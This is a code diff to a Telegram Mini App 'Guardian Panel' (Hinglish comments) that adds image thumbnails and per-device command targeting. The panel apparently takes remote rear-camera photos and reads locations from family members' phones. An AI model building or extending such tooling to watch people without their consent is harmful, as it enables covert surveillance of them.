@@ -205,6 +205,13 @@ table.t tr:hover td{background:#0c1017}
  .section h2{font-size:1rem}
 }
 @media(max-width:360px){.stats,.quick,.qrow{grid-template-columns:minmax(0,1fr)}}
+
+/* ---------- 📷 v4.9 panel par chhoti tasveer ---------- */
+.thumbs{display:flex;gap:10px;flex-wrap:wrap;margin:8px 0 2px}
+.thumbcard{margin:0;background:#0b0f16;border:1px solid var(--line);border-radius:12px;padding:8px;width:118px}
+.thumbcard img{width:100%;height:74px;object-fit:cover;border-radius:8px;display:block;background:#111827}
+.thumbcard figcaption{font-size:.68rem;color:var(--muted);margin-top:5px;line-height:1.25}
+.thumbcard .thumptxt{font-size:.7rem;color:#c9d2e0;margin-top:4px;line-height:1.3;max-height:2.6em;overflow:hidden}
 </style></head><body>
 
 <!-- ===== Telegram ke andar hi (Mini App) — bahar ka koi link nahi ===== -->
@@ -663,7 +670,7 @@ addFeed('📷','Rear camera se photo','Papa ka phone · P1AA','ok');
 addFeed('📍','Location','Mera phone · DQT3','info');
 setTimeout(function(){ renderDevices(); }, 400);
 </script>
-  <p class="footer">Guardian Panel v4.7 · aapka apna pul (Cloudflare) · Telegram Mini App</p>
+  <p class="footer">Guardian Panel v4.9 · aapka apna pul (Cloudflare) · Telegram Mini App</p>
 <script>
 /* ==========================================================================
    🎛️ Guardian Panel — ASLI (v4.7)
@@ -705,7 +712,7 @@ function gDev(d){
     net: fresh ? 'Online' : 'Offline', place: place, ver: st.ver || d.ver || '', loc: loc, raw: st
   };
 }
-var G_EVENTS = [], G_NOTIS = [], G_PRIMARY = '';
+var G_EVENTS = [], G_NOTIS = [], G_THUMBS = [], G_PRIMARY = '';
 
 function gRenderFeeds(){
   var f = $('#feed');
@@ -729,10 +736,21 @@ function gRenderFeeds(){
   }
 }
 
+function gThumbs(){
+  var box = $('#lastThumb');
+  if (!box) return;
+  if (!G_THUMBS.length) { box.innerHTML = ''; return; }
+  box.innerHTML = G_THUMBS.slice(-3).reverse().map(function(t){
+    return '<figure class="thumbcard"><img src="' + t.thumb + '" alt="tasveer" loading="lazy">' +
+      '<figcaption>' + gEsc(t.dev || '') + '<br><span class="mono">' + gTime(t.at) + '</span></figcaption>' +
+      '<div class="thumptxt">' + gTxt(t.text || '') + '</div></figure>';
+  }).join('');
+}
+
 function gResult(text){
   var box = $('#lastResult');
   if (!box) {
-    box = El('div', 'card', '<b>⬅️ Phone se aaya jawab</b><div id="lastResultText" style="margin-top:7px"></div>');
+    box = El('div', 'card', '<b>⬅️ Phone se aaya jawab</b><div id="lastThumb" class="thumbs"></div><div id="lastResultText" style="margin-top:7px"></div>');
     box.id = 'lastResult';
     var dash = $('#v-dash');
     if (dash) dash.insertBefore(box, dash.children[2] || null);
@@ -760,8 +778,9 @@ function gRefresh(){
     }
     G_EVENTS = j.events || [];
     G_NOTIS = j.notis || [];
+    G_THUMBS = j.thumbs || [];
     try { renderDevices(); renderCardChips(); refreshStats(); offlineNote(); } catch (e) {}
-    gRenderFeeds();
+    gRenderFeeds(); gThumbs();
     if (j.result && j.result.text && (!$('#lastResultText') || j.result.at !== LAST_CID_AT)) {
       LAST_CID_AT = j.result.at; gResult(j.result.text);
     }
@@ -780,7 +799,7 @@ function send(btn, label, em, backTo){
   var text = String(label || '').indexOf('/') === 0 ? label : '/' + label;
   if (btn) btn.classList.add('sending');
   toast((d.on ? '📨 ' : '🕓 ') + em + ' ' + d.name + ' ko bhej diya' + (d.on ? '' : ' (offline — net aate hi chalegi)'));
-  guard('/c', { t: TOKEN, text: text }).then(function(r){
+  guard('/c', { t: TOKEN, text: text, to: d.i }).then(function(r){
     if (btn) { btn.classList.remove('sending'); btn.classList.add('done');
       setTimeout(function(){ btn.classList.remove('done'); }, 1200); }
     if (!r || !r.ok) { toast('⚠️ ' + ((r && r.err) || 'pul se baat nahi hui')); return; }
